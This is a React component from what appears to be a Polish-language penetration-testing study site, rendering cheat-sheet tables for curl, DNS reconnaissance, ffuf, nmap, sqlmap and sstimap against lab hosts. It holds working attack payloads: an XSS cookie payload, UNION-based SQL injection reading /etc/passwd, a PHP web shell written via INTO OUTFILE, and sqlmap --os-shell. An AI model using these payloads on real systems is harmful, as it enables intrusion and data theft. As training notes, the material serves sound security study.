import './commends.scss';
import { Link } from 'react-router-dom';
import sstimap_functions from '../../assets/sstimap_functions.png';
import ExampleFrame from '../exampleFrame/ExampleFrame';

const Commends = () => {

    return(
        <section className='commends'>
            <h1>Linux commends</h1>

            <h2 id='curl'>cURL</h2>
            <table>
                <thead>
                    <tr>
                        <th>Komenda</th>
                        <th>Przykład</th>
                        <th>Opis</th>
                    </tr>
                </thead>
                <tbody>
                <tr>
                    <td>curl -O (nazwa strony HTTP)</td>
                    <td>curl -O inlanefreight.com/index.html</td>
                    <td>Pobieranie pliku</td>
                </tr>
                <tr>
                    <td>curl -s (nazwa strony HTTP)</td>
                    <td>curl -s inlanefreight.com/index.html</td>
                    <td>Wyciszenie zbędnych danych</td>
                </tr>
                <tr>
                    <td>curl -k (nazwa strony HTTPS://)</td>
                    <td>curl -k https://inlanefreight.com/index.html</td>
                    <td>Pomijanie certyfikatu SSL</td>
                </tr>
                <tr>
                    <td>curl -v (nazwa strony HTTP://)</td>
                    <td>curl -v inlanefreight.com</td>
                    <td>Pełen request oraz response</td>
                </tr>
                <tr>
                    <td>curl -vvv (nazwa strony HTTP://)</td>
                    <td>curl -vvv inlanefreight.com</td>
                    <td>Szczegółowy request oraz response</td>
                </tr>
                <tr>
                    <td>curl -u (nazwa strony HTTP://)</td>
                    <td>curl -u http://inlanefreight.com</td>
                    <td>Podstawowe poświadczenia autoryzacji HTTP</td>
                </tr>
                <tr>
                    <td>curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' (nazwa strony HTTP://)</td>
                    <td>curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://inlanefreight.com</td>
                    <td>Set request header, można wielokrotnie użyć by ustawić wiele nagłówków</td>
                </tr>
                <tr>
                    <td>curl -X POST -d 'username=admin&password=admin' (nazwa strony HTTP://)</td>
                    <td>curl -X POST -d 'username=admin&password=admin' http://inlanefreight.com</td>
                    <td>Wyślij żądanie POST z danymi</td>
                </tr>
                <tr>
                    <td>curl -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' (nazwa strony HTTP://)</td>
                    <td>curl -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' http://inlanefreight.com</td>
                    <td>Ustaw żądanie plików cookie</td>
                </tr>
                <tr>
                    <td>curl -X POST -d {"{"}"search":"london"{"}"} -H 'Content-Type: application/json' (nazwa strony HTTP://)</td>
                    <td>curl -X POST -d {"{"}"search":"london"{"}"} -H 'Content-Type: application/json' http://inlanefreight.com</td>
                    <td>Ustaw żądanie plików cookie</td>
                </tr>
                </tbody>
            </table>

            <hr />

            <h2>XSS</h2>
            <p className='important'>{'#"><img src=/ onerror=alert(document.cookie)>'}</p>

            <h3>XSStrike</h3>
            <p className='important'>python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" </p>

            <hr />

            <h2>WHOIS</h2>
            <h4 className='important'>whois inlanefreight.com</h4>
            <ul>
                <li>
                    <span className='important'>Nazwa domeny (Domain Name)</span>: Nazwa domeny (np. example.com)</li>
                <li>
                    <span className='important'>Zarejstrowana (Registrar)</span>: Firma, w której zarejestrowana została domena (np. GoDaddy, Namecheap)</li>
                <li>
                    <span className='important'>Kontakt z rejestrującym (Registrant Contact)</span>: Osoba lub organizacja, która zarejestrowała domenę.</li>
                <li>
                    <span className='important'>Kontakt administracyjny (Administrative Contact)</span>: Osoba odpowiedzialna za zarządzanie domeną (The person responsible for managing the domain)</li>
                <li>
                    <span className='important'>Kontakt techniczny (Technical Contact)</span>: Osoba zajmująca się sprawami technicznymi związanymi z domeną.</li>
                <li>
                    <span className='important'>Daty utworzenia i wygaśnięcia (Creation and Expiration Dates)</span>: Kiedy domena została zarejestrowana i kiedy wygaśnie.</li>
                <li>
                <span className='important'>Nazwa serwera (Name Servers)</span>: Serwery tłumaczące nazwę domeny na adres IP.</li>
            </ul>

            <hr />

            <h2 id="dig">dig (Domain Information Groper)</h2>
            <p>Polecenie dig (Domain Information Groper) to wszechstronne i potężne narzędzie do wysyłania zapytań do serwerów DNS i pobierania różnych typów rekordów DNS. Jego elastyczność oraz szczegółowe i konfigurowalne wydruki sprawiają, że jest to doskonały wybór.</p>
            <table class="table table-striped text-left">
                <thead>
                    <tr>
                    <th>Komenda</th>
                    <th>Opis</th>
                    </tr>
                </thead>
                <tbody className='description'>
                    <tr>
                    <td>dig domain.com</td>
                    <td>Wykonuje domyślne wyszukiwanie rekordów A dla domeny.</td>
                    </tr>
                    <tr>
                    <td>dig domain.com A</td>
                    <td>Pobiera adres IPv4 (rekord A) powiązany z domeną.</td>
                    </tr>
                    <tr>
                    <td>dig domain.com AAAA</td>
                    <td>Pobiera adres IPv6 (rekord AAAA) powiązany z domeną.</td>
                    </tr>
                    <tr>
                    <td>dig domain.com MX</td>
                    <td>Znajduje serwery pocztowe (rekordy MX) odpowiedzialne za domenę.</td>
                    </tr>
                    <tr>
                    <td>dig domain.com NS</td>
                    <td>Identyfikuje autorytatywne serwery nazw dla domeny.</td>
                    </tr>
                    <tr>
                    <td>dig domain.com TXT</td>
                    <td>Pobiera wszystkie rekordy TXT powiązane z domeną.</td>
                    </tr>
                    <tr>
                    <td>dig domain.com CNAME</td>
                    <td>Pobiera rekord nazwy kanonicznej (CNAME) dla domeny.</td>
                    </tr>
                    <tr>
                    <td>dig domain.com SOA</td>
                    <td>Pobiera rekord początku uprawnień (SOA) dla domeny.</td>
                    </tr>
                    <tr>
                    <td>dig @1.1.1.1 domain.com</td>
                    <td>Określa konkretny serwer nazw, do którego ma zostać wysłane zapytanie; w tym przypadku 1.1.1.1</td>
                    </tr>
                    <tr>
                    <td>dig +trace domain.com</td>
                    <td>Pokazuje pełną ścieżkę rozpoznawania DNS.</td>
                    </tr>
                    <tr>
                    <td>dig -x 192.168.1.1</td>
                    <td>Wykonuje wyszukiwanie wsteczne adresu IP 192.168.1.1 w celu znalezienia powiązanej nazwy hosta. Może być konieczne określenie serwera nazw.</td>
                    </tr>
                    <tr>
                    <td>dig +short domain.com</td>
                    <td>Podaje krótką i zwięzłą odpowiedź na zapytanie.</td>
                    </tr>
                    <tr>
                    <td>dig +noall +answer domain.com</td>
                    <td>Wyświetla tylko sekcję odpowiedzi wyniku zapytania.</td>
                    </tr>
                    <tr>
                    <td>dig domain.com ANY</td>
                    <td>Pobiera wszystkie dostępne rekordy DNS dla domeny (Uwaga: wiele serwerów DNS ignoruje ANY zapytania, aby zmniejszyć obciążenie i zapobiec nadużyciom, zgodnie z RFC 8482).</td>
                    </tr>
                    <tr>
                    <td>dig axfr @nsztm1.digi.ninja(DNS server) zonetransfer.me</td>
                    <td>To polecenie instruuje dig, aby zażądał pełnego transferu strefy (axfr) z serwera DNS odpowiedzialnego zazonetransfer.me. Jeśli serwer jest źle skonfigurowany i pozwala na transfer, otrzymasz pełną listę rekordów DNS dla domeny, łącznie ze wszystkimi subdomenami.</td>
                    </tr>
                </tbody>
            </table>
            <div className='waring'>
                <p>Uwaga: niektóre serwery mogą wykrywać i blokować nadmierną liczbę zapytań DNS. Zachowaj ostrożność i przestrzegaj limitów stawek. Zawsze uzyskaj pozwolenie przed wykonaniem obszernego rozpoznania DNS celu.</p>
            </div>

            <hr />

            <h2><Link to='/tools'>dnsenum</Link></h2>
            <p>Kompleksowe narzędzie do wyliczania DNS, które obsługuje ataki słownikowe i brute-force w celu wykrycia subdomen.</p>
            <table>
                <thead>
                    <tr>
                    <th>Komenda</th>
                    </tr>
                </thead>
                <tbody className='description'>
                    <tr>
                    <td>dnsenum --enum (nazwa strony) -f (lista słów (word list)) -r</td>
                    </tr>
                    <tr>
                    <td>dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r</td>
                    </tr>
                    <tr>
                    <td>dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb</td>
                    </tr>
                </tbody>
            </table>

            <hr />

            <h2><Link to='/tools'>gobuster</Link></h2>
            <p>Wielozadaniowe narzędzie często używane do brutalnego wymuszania katalogów/plików, ale także skuteczne do wykrywania hostów wirtualnych.</p>
            <table>
                <thead>
                    <tr>
                    <th>Komenda</th>
                    </tr>
                </thead>
                <tbody className='description'>
                    <tr>
                    <td>gobuster vhost -u (http://target_IP_address) -w (wordlist_file) --append-domain</td>
                    </tr>
                    <tr>
                    <td>gobuster vhost -u http://inlanefreight.htb:81 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain</td>
                    </tr>
                </tbody>
            </table>

            <div className='waring'>
                <p>W nowszych wersjach Gobustera flaga --append-domain jest wymagana w celu dołączenia domeny bazowej do każdego słowa na liście słów podczas wykrywania hosta wirtualnego. Ta flaga zapewnia, że ​​Gobuster poprawnie konstruuje pełne wirtualne nazwy hostów, co jest niezbędne do dokładnego wyliczenia potencjalnych subdomen. W starszych wersjach Gobuster ta funkcjonalność była obsługiwana inaczej i flaga --append-domain nie była konieczna. Użytkownicy starszych wersji mogą uznać tę flagę za niedostępną lub potrzebną, ponieważ narzędzie domyślnie dołączało domenę bazową lub wykorzystywało inny mechanizm generowania hosta wirtualnego.</p>
            </div>

            <hr />

            <h2>FFUF - Fuzzing</h2>
            <p>Odkrywanie stron.</p>
            <table>
                <thead>
                    <tr>
                    <th>Opis</th>
                    <th>Komenda</th>
                    </tr>
                </thead>
                <tbody className='reverse'>
                    <tr>
                        <td>Odkrywanie katalogów</td>
                        <td>ffuf -w directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ</td>
                    </tr>
                    <tr>
                        <td>Odkrywanie drzewa subkatalogów o głębokości 1</td>
                        <td>ffuf -w directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v</td>
                    </tr>
                    <tr>
                        <td>Odkrywanie subkatalogów</td>
                        <td>ffuf -w subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.SERVER_IP:PORT/</td>
                    </tr>
                    <tr>
                        <td>Odkrywanie subkatalogów Vhostów</td>
                        <td>ffuf -w subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb'</td>
                    </tr>
                    <tr>
                        <td>Odkrywanie parametrów</td>
                        <td>ffuf -w burp-parameter-names.txt:FUZZ -u http://SERVER_IP:PORT/index.php?FUZZ=key</td>
                    </tr>
                    <tr>
                        <td>Odkrywanie parametrów POST</td>
                        <td>ffuf -w burp-parameter-names.txt:FUZZ -u http://SERVER_IP:PORT/index.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded'</td>
                    </tr>
                    <tr>
                        <td>Odkrywanie wartości POST</td>
                        <td>ffuf -w ids.txt:FUZZ -u http://SERVER_IP:PORT/index.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded'</td>
                    </tr>
                    <tr>
                        <td>Odkrywanie rozszerzenia plików</td>
                        <td>ffuf -w web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ</td>
                    </tr>
                    <tr>
                        <td>Enumeracja portów SSRF</td>
                        <td>ffuf -w ./ports.txt -u http://SERVER_IP/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://SERVER_IP:FUZZ/&date=2024-01-01" -fr "Failed to connect to"</td>
                    </tr>
                    <tr>
                        <td>Enumeracja LFI Api</td>
                        <td>ffuf -w /SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt:FUZZ -u 'http://{`<TARGET IP>`}:3000/api/FUZZ'"</td>
                    </tr>
                </tbody>
            </table>

            <hr />

            <h2>MySQL</h2>

            <table>
                <thead>
                    <tr>
                    <th>Komenda</th>
                    </tr>
                </thead>
                <tbody className='description'>
                    <tr>
                    <td>mysql -u root -p</td>
                    </tr>
                    <tr>
                    <td>mysql -u root -p{'<password>'}</td>
                    </tr>
                    <tr>
                    <td>mysql -u root -h {'<host/ ip>'} -P {'<port>'} -p </td>
                    </tr>
                    <tr>
                    <td>SHOW DATABASES; </td>
                    </tr>
                    <tr>
                    <td>USE {'<nazwa bazy>'}; </td>
                    </tr>
                    <tr>
                    <td>SHOW  {'<nazwa tabeli>'}; </td>
                    </tr>
                    <tr>
                    <td>SELECT * FROM logins WHERE username LIKE 'zaczynające się od(..)%'; </td>
                    </tr>
                    <tr>
                    <td>SELECT * FROM logins WHERE username like '(ilość znaków)_ _ _'; </td>
                    </tr>
                    <tr>
                    <td>SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;</td>
                    </tr>
                    <tr>
                    <td>cn' UNION select 1, kolumna 1, kolumna 2, 4 from {'<nazwa bazy danych>'}.{'<nazwa tabeli>'}-- -</td>
                    </tr>
                    <tr>
                    <td>cn' union select "",'{'<'}?php system($_REQUEST[0]); ?{'>'}', "", "" into outfile '/var/www/html/shell.php'-- -</td>
                    </tr>
                </tbody>
            </table>
            <table>
                <thead>
                    <tr>
                    <th>Komenda</th>
                    <th>Przykład</th>
                    <th>Opis</th>
                    </tr>
                </thead>
                <tbody className='description'>
                    <tr>
                    <td>database()</td>
                    <td>cn' UNION select 1,database(),2,3-- -</td>
                    <td>Zwraca aktualną bazę danych</td>
                    </tr>
                    <tr>
                    <td>user()</td>
                    <td>cn' UNION select 1,user(),2,3-- -</td>
                    <td>Zwraca aktualnego użytkownika</td>
                    </tr>
                    <tr>
                    <td>INFORMATION_SCHEMA.TABLES</td>
                    <td>cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='{'<nazwa bazy danych>'}'-- -</td>
                    <td>Zwraca table w bazie danych</td>
                    </tr>
                    <tr>
                    <td>INFORMATION_SCHEMA.COLUMNS</td>
                    <td>cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='{'<nazwa tabeli>'}'-- -</td>
                    <td>Zwraca kolumny we wskazanej tabeli</td>
                    </tr>
                    <tr>
                    <td>mysql.user -{'>'} super_priv</td>
                    <td>cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user='{'<nazwa użytkownika>'}'-- -</td>
                    <td>Zwraca boolean czy użytkownik jest super użytkownikiem (Y/ N)</td>
                    </tr>
                    <tr>
                    <td>information_schema.user_privileges</td>
                    <td>cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee='{"<nazwa użytkownika> ('root'@'localhost')"}'-- -</td>
                    <td>Zwraca boolean czy użytkownik jest super użytkownikiem (Y/ N)</td>
                    </tr>
                    <tr>
                    <td>LOAD_FILE("{'<ścieżka do pliku>'}")</td>
                    <td>cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -</td>
                    <td>Zwraca zawartość pliku</td>
                    </tr>
                    <tr>
                    <td>information_schema.global_variables -{'>'}secure_file_priv</td>
                    <td>cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -</td>
                    <td>Sprawdzamy możliwości zapisu plików</td>
                    </tr>
                    <tr>
                    <td>INTO OUTFILE</td>
                    <td>SELECT {'wartość do zapisania'} INTO OUTFILE '{'output gdzie to ma zostać zapisane'}';</td>
                    <td>Sprawdzamy zapisywanie w pliku</td>
                    </tr>
                </tbody>
            </table>

            <hr />

            <h2>SQLMap</h2>
            <table>
                <thead>
                    <tr>
                    <th><strong>Command</strong></th>
                    <th><strong>Description</strong></th>
                    </tr>
                </thead>
                <tbody className='description'>
                    <tr>
                    <td>sqlmap -u "http://www.example.com/vuln.php?id=1" --batch</td>
                    <td>Uruchom SQLMap bez pytania użytkownika o dane wejściowe</td>
                    </tr>
                    <tr>
                    <td>sqlmap 'http://www.example.com/' --data 'uid=1&name=test'</td>
                    <td>SQLMap z żądaniem POST</td>
                    </tr>
                    <tr>
                    <td>sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'</td>
                    <td>Żądanie POST określające punkt wtrysku gwiazdką</td>
                    </tr>
                    <tr>
                    <td>sqlmap -r req.txt</td>
                    <td>Przekazywanie pliku żądania HTTP do SQLMap</td>
                    </tr>
                    <tr>
                    <td>sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'</td>
                    <td>Określanie nagłówka pliku cookie</td>
                    </tr>
                    <tr>
                    <td>sqlmap -u www.target.com --data='id=1' --method PUT</td>
                    <td>Określanie żądania PUT</td>
                    </tr>
                    <tr>
                    <td>sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt</td>
                    <td>Przechowuj ruch w pliku wyjściowym</td>
                    </tr>
                    <tr>
                    <td>sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch</td>
                    <td>Określ poziom szczegółowości</td>
                    </tr>
                    <tr>
                    <td>sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"</td>
                    <td>Określanie prefix lub suffix</td>
                    </tr>
                    <tr>
                    <td>sqlmap -u www.example.com/?id=1 -v 3 --level=5</td>
                    <td>Określanie poziomu ryzyka</td>
                    </tr>
                    <tr>
                    <td>sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba</td>
                    <td>Podstawowe wyliczanie bazy danych</td>
                    </tr>
                    <tr>
                    <td>sqlmap -u "http://www.example.com/?id=1" --tables -D testdb</td>
                    <td>Wyliczenie tabel</td>
                    </tr>
                    <tr>
                    <td>sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname</td>
                    <td>Wyliczenie tabeli/wiersza</td>
                    </tr>
                    <tr>
                    <td>sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"</td>
                    <td>Wyliczenie warunkowe</td>
                    </tr>
                    <tr>
                    <td>sqlmap -u "http://www.example.com/?id=1" --schema</td>
                    <td>Wyliczenie schema </td>
                    </tr>
                    <tr>
                    <td>sqlmap -u "http://www.example.com/?id=1" --search -T user</td>
                    <td>Wyszukiwanie danych</td>
                    </tr>
                    <tr>
                    <td>sqlmap -u "http://www.example.com/?id=1" --passwords --batch</td>
                    <td>Wyliczanie i łamanie haseł</td>
                    </tr>
                    <tr>
                    <td>sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"</td>
                    <td>Obejście tokenu anty-CSRF</td>
                    </tr>
                    <tr>
                    <td>sqlmap --list-tampers</td>
                    <td>Lista wszystkich skryptów sabotażu</td>
                    </tr>
                    <tr>
                    <td>sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba</td>
                    <td>Sprawdź uprawnienia DBA</td>
                    </tr>
                    <tr>
                    <td>sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"</td>
                    <td>Czytanie pliku lokalnego</td>
                    </tr>
                    <tr>
                    <td>sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"</td>
                    <td>Zapisywanie pliku</td>
                    </tr>
                    <tr>
                    <td>sqlmap -u "http://www.example.com/?id=1" --os-shell</td>
                    <td>Tworzenie powłoki systemu operacyjnego</td>
                    </tr>
                </tbody>
            </table>

            <hr />

            <h2>sstimap</h2>

            <table>
                <thead>
                    <tr>
                    <th><strong>Komenda</strong></th>
                    <th><strong>Opis</strong></th>
                    </tr>
                </thead>
                <tbody className='description'>
                    <tr>
                    <td>python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'</td>
                    <td>Pobiera zdalny plik na naszą lokalną maszynę</td>
                    </tr>
                    <tr>
                    <td>python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id</td>
                    <td>Wykonywanie polecenie systemowe</td>
                    </tr>
                    <tr>
                    <td>sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'</td>
                    <td>Interaktywna powłoka</td>
                    </tr>
                </tbody>
            </table>
            <ExampleFrame screen={sstimap_functions} />

            <hr />
            <h2>Nmap</h2>

            <table>
                <thead>
                    <tr>
                        <th><strong>Nmap Opcja</strong></th>
                        <th><strong>Opis</strong></th>
                        <th><strong>Przykład</strong></th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td><code>-iL</code></td>
                        <td>Wyłącza Ip z pliku</td>
                        <td>nmap -sn -oA tnet -iL hosts.lst</td>
                    </tr>
                    <tr>
                        <td><code>-sn</code></td>
                        <td>Wyłącza skanowanie portów</td>
                        <td>nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d" " -f5</td>
                    </tr>
                    <tr>
                        <td><code>-Pn</code></td>
                        <td>Wyłącza żądania echa ICMP</td>
                        <td>nmap 10.129.2.28 -p 139 --packet-trace -n --disable-arp-ping -Pn</td>
                    </tr>
                    <tr>
                        <td><code>-n</code></td>
                        <td>Wyłącza rozpoznawanie DNS</td>
                        <td>nmap 10.129.2.28 -p 139 --packet-trace -n --disable-arp-ping -Pn</td>
                    </tr>
                    <tr>
                        <td><code>-PE</code></td>
                        <td>Wykonuje skanowanie ping przy użyciu żądań echa ICMP względem celu.</td>
                        <td>nmap 10.129.2.18 -sn -oA host -PE --packet-trace</td>
                    </tr>
                    <tr>
                        <td><code>--packet-trace</code></td>
                        <td>Pokazuje wszystkie wysłane i odebrane pakiety.</td>
                        <td>nmap 10.129.2.18 -sn -oA host -PE --packet-trace</td>
                    </tr>
                    <tr>
                        <td><code>--reason</code></td>
                        <td>Wyświetla przyczynę określonego wyniku.</td>
                        <td>nmap 10.129.2.18 -sn -oA host -PE --reason</td>
                    </tr>
                    <tr>
                        <td><code>--disable-arp-ping</code></td>
                        <td>Wyłącza żądania ping ARP.</td>
                        <td>nmap 10.129.2.18 -sn -oA host -PE --packet-trace --disable-arp-ping </td>
                    </tr>
                    <tr>
                        <td><code>--top-ports=&lt;num&gt;</code></td>
                        <td>Skanuje określone główne porty, które zostały zdefiniowane jako najczęściej.</td>
                        <td>nmap 10.129.2.28 --top-ports=10</td>
                    </tr>
                    <tr>
                        <td><code>-p-</code></td>
                        <td>Skanuje wszystkie porty.</td>
                        <td>nmap 10.129.2.28 -p- -oA target</td>
                    </tr>
                    <tr>
                        <td><code>-p22-110</code></td>
                        <td>Skanuje wszystkie porty między 22 a 110.</td>
                        <td></td>
                    </tr>
                    <tr>
                        <td><code>-p22,25</code></td>
                        <td>Skanuje tylko wyznaczone porty 22 i 25.</td>
                        <td>nmap 10.129.2.28 -p22,25 --packet-trace -Pn -n --disable-arp-ping</td>
                    </tr>
                    <tr>
                        <td><code>-F</code></td>
                        <td>Skanije najczęstszych 100 portów.</td>
                        <td>nmap 10.129.2.0/24 -F</td>
                    </tr>
                    <tr>
                        <td><code>-sS</code></td>
                        <td>Wykonuje skanowanie SYN protokołu TCP.</td>
                        <td>nmap 10.129.2.28 -p 21,22,25 -sS -Pn -n --disable-arp-ping --packet-trace</td>
                    </tr>
                    <tr>
                        <td><code>-sA</code></td>
                        <td>Wykonuje skanowanie ACK protokołu TCP.</td>
                        <td>nmap 10.129.2.28 -p 21,22,25 -sA -Pn -n --disable-arp-ping --packet-trace</td>
                    </tr>
                    <tr>
                        <td><code>-sU</code></td>
                        <td>Wykonuje skanowanie UDP.</td>
                        <td>nmap 10.129.2.28 -F -sU</td>
                    </tr>
                    <tr>
                        <td><code>-sV</code></td>
                        <td>Skanuje wykryte usługi w poszukiwaniu ich wersji.</td>
                        <td>nmap 10.129.2.28 -Pn -n --disable-arp-ping --packet-trace -p 445 --reason -sV</td>
                    </tr>
                    <tr>
                        <td><code>-sC</code></td>
                        <td>Wykonaj skanowanie skryptów ze skryptami sklasyfikowanymi jako „domyślne”</td>
                        <td></td>
                    </tr>
                    <tr>
                        <td><code>--script &lt;script&gt;</code></td>
                        <td>Wykonuje skanowanie skryptów przy użyciu określonych skryptów.</td>
                        <td></td>
                    </tr>
                    <tr>
                        <td><code>--script banner,smtp-commands</code></td>
                        <td>Używa określonych skryptów NSE.</td>
                        <td>nmap 10.129.2.28 -p 25 --script banner,smtp-commands</td>
                    </tr>
                    <tr>
                        <td><code>--script vuln</code></td>
                        <td>Używa wszystkich powiązanych skryptów z określonej kategorii.</td>
                        <td>nmap 10.129.2.28 -p 80 -sV --script vuln </td>
                    </tr>
                    <tr>
                        <td><code>-O</code></td>
                        <td>Wykonuje skanowanie w celu wykrycia systemu operacyjnego w celu określenia systemu operacyjnego docelowego</td>
                        <td></td>
                    </tr>
                    <tr>
                        <td><code>-A</code></td>
                        <td>Wykonuje wykrywanie systemu operacyjnego, wykrywanie usług i skanowanie trastraute.</td>
                        <td>nmap 10.129.2.28 -p 80 -A</td>
                    </tr>
                    <tr>
                        <td><code>-D RND:5</code></td>
                        <td>Ustawia liczbę losowych wabików, które zostaną użyte do przeskanowania celu.</td>
                        <td>nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5</td>
                    </tr>
                    <tr>
                        <td><code>-e</code></td>
                        <td>Określa interfejs sieciowy używany do skanowania.</td>
                        <td>nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0</td>
                    </tr>
                    <tr>
                        <td><code>-S 10.10.10.200</code></td>
                        <td>Określa źródłowy adres IP dla skanowania.</td>
                        <td>nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0</td>
                    </tr>
                    <tr>
                        <td><code>-g</code></td>
                        <td>Określa port źródłowy skanowania.</td>
                        <td></td>
                    </tr>
                    <tr>
                        <td><code>--dns-server &lt;ns&gt;</code></td>
                        <td>Rozpoznawanie DNS jest wykonywane przy użyciu określonego serwera nazw.</td>
                        <td></td>
                    </tr>
                    <tr>
                        <td><code>--max-retries &lt;num&gt;</code></td>
                        <td>Ustawia liczbę ponownych prób skanowania określonych portów.</td>
                        <td></td>
                    </tr>
                    <tr>
                        <td><code>--stats-every=5s</code></td>
                        <td>Wyświetla status skanowania co 5 sekund.</td>
                        <td>nmap 10.129.2.28 -p- -sV --stats-every=5s</td>
                    </tr>
                    <tr>
                        <td><code>-v/-vv</code></td>
                        <td>Wyświetla szczegółowe dane wyjściowe podczas skanowania.</td>
                        <td>nmap 10.129.2.28 -p- -sV -v </td>
                    </tr>
                    <tr>
                        <td><code>--initial-rtt-timeout 50ms</code></td>
                        <td>Ustawia określoną wartość czasu jako początkowy limit czasu RTT.</td>
                        <td>nmap 10.129.2.0/24 -F --initial-rtt-timeout 50ms --max-rtt-timeout 100ms</td>
                    </tr>
                    <tr>
                        <td><code>--max-rtt-timeout 100ms</code></td>
                        <td>Ustawia określoną wartość czasu jako maksymalny limit czasu RTT.</td>
                        <td>nmap 10.129.2.0/24 -F --initial-rtt-timeout 50ms --max-rtt-timeout 100ms</td>
                    </tr>
                    <tr>
                        <td><code>--min-rate 300</code></td>
                        <td>Ustawia liczbę pakietów, które zostaną wysłane jednocześnie.</td>
                        <td>nmap 10.129.2.0/24 -F -oN tnet.minrate300 --min-rate 300</td>
                    </tr>
                    <tr>
                        <td><code>-T &lt;0-5&gt;</code></td>
                        <td>Określa konkretny szablon chronometrażu/ Szybkość skanowania (Im szybsze tym łatwiej zostać złapanym).</td>
                        <td>nmap 10.129.2.0/24 -F -oN tnet.T5 -T 5</td>
                    </tr>
                    <tr>
                        <td>--script-updatedb</td>
                        <td>Aktualizacja skryptów nmap</td>
                        <td>sudo nmap --script-updatedb</td>
                    </tr>
                    <tr>
                        <td></td>
                        <td>FTP</td>
                        <td></td>
                    </tr>
                    <tr>
                        <td>FTP - skrypty</td>
                        <td>find / -type f -name ftp* 2{`>`}/dev/null | grep scripts</td>
                        <td></td>
                    </tr>
                    <tr>
                        <td></td>
                        <td>SMB</td>
                        <td></td>
                    </tr>
                    <tr>
                        <td>SMB - porty</td>
                        <td>nmap 10.129.14.128 -sV -sC -p139,445</td>
                        <td></td>
                    </tr>
                    <tr>
                        <td></td>
                        <td>NFS</td>
                        <td></td>
                    </tr>
                    <tr>
                        <td>NFS - porty</td>
                        <td>nmap 10.129.14.128 -p111,2049 -sV -sC</td>
                        <td></td>
                    </tr>
                    <tr>
                        <td>NFS - script</td>
                        <td>nmap --script nfs* 10.129.14.128 -sV -p111,2049</td>
                        <td></td>
                    </tr>
                    <tr>
                        <td></td>
                        <td>SMTP</td>
                        <td></td>
                    </tr>
                    <tr>
                        <td>SMTP - script</td>
                        <td>nmap 10.129.14.128 -p25 --script smtp-open-relay -v</td>
                        <td></td>
                    </tr>
                    <tr>
                        <td></td>
                        <td>IMAP/ POP3</td>
                        <td></td>
                    </tr>
                    <tr>
                        <td>IMAP/ POP3 - footprinting</td>
                        <td>nmap 10.129.14.128 -sV -p110,143,993,995 -sC</td>
                        <td></td>
                    </tr>
                    <tr>
                        <td></td>
                        <td>MySql</td>
                        <td></td>
                    </tr>
                    <tr>
                        <td>MySql - scripts</td>
                        <td>nmap 10.129.14.128 -sV -sC -p3306 --script mysql*</td>
                        <td></td>
                    </tr>
                    <tr>
                        <td></td>
                        <td>MSSQL</td>
                        <td></td>
                    </tr>
                    <tr>
                        <td>MSSQL - scripts</td>
                        <td>nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248</td>
                        <td></td>
                    </tr>
                    <tr>
                        <td>MSSQL - metasploit</td>
                        <td>scanner/mssql/mssql_ping</td>
                        <td></td>
                    </tr>
                    <tr>
                        <td></td>
                        <td>RDP</td>
                        <td></td>
